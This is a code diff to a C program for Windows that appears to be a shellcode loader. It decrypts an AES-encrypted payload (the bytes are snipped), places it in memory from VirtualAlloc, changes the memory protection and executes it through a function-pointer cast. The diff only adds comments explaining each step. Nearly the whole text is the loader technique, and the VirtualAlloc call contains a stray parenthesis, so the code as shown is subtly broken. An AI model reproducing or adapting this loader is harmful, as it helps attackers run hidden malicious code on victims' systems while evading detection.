@@ -162,18 +162,20 @@ int main() {
 unsigned char payload[] = {
   <SNIP>
 };
-
+    // Allocate read-write memory the size of our payload
   	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload)), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	if (!alloc_mem) {
 		printf("Failed to Allocate memory (%u)\n", GetLastError());
 		return -1;
 	}
-	
-    AES_ctx ctx = {0};
+
+	// Decrypt payload
+  AES_ctx ctx = {0};
 	AES_init_ctx_iv(&ctx, key, iv);
 	AES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));
 
+  // Copy decrypted payload into memory
 	RtlMoveMemory(alloc_mem, payload, sizeof(payload));
 
 	DWORD oldProtect;
@@ -182,7 +184,7 @@ unsigned char payload[] = {
 		printf("Failed to change memory protection (%u)\n", GetLastError());
 		return -2;
 	}
-
+  // This part is casting alloc_mem to a void(*)() pointer. This means that it's treating the memory allocated by alloc_mem as a function.
   ((void(*)())alloc_mem)();
 
 	printf("\n\nalloc_mem : %p\n", alloc_mem);
